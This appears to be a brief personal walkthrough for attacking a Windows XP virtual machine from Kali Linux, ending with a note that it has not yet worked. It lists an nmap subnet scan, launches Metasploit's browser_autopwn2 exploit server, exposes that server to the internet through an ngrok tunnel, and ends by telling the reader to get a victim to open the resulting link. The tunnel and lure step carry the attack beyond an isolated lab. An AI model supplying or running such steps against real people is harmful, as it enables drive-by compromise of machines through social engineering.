Boot / Install Kali

Install Windows XP service pack 2 on a virtualbox image, and boot it.

On both the Windows VM and the Kali VM (if using Kali in a VM) click Network Settings
![](http://teachthe.net/topclipbox/2016-05-04_10-13-217I0PL4.png)

Select Bridged Adapter and hit OK.

In Kali, run nmap:
```
nmap -sV 192.168.0.0-254
```

From this, find the victim IP address and insert it in the commands below in place of "192.168.0.103"

```shell
$ msfconsole
> use auxiliary/server/browser_autopwn2
> run
```

You will see something like this:

![](http://teachthe.net/topclipbox/2016-05-08_11-51-14B1QX3N.png)

We want the url from that:
```
http://192.168.0.101:8080/qlGmgjhJgz
```

Download ngrok & cd to it's directory.

```
$ ngrok http 8080
```

Note that ngrok's port is matching from your URL!

You should now see something like this:

![](http://teachthe.net/topclipbox/2016-05-08_11-55-24RBIISL.png)

Take that ngrok URL:
```
http://367d5238.ngrok.io
```

And add on the end of it the path from your metasploit browser autopwn url:

```
http://367d5238.ngrok.io/qlGmgjhJgz
```

Note get your victim to open that url!


[NOTE - unsuccessful thus far]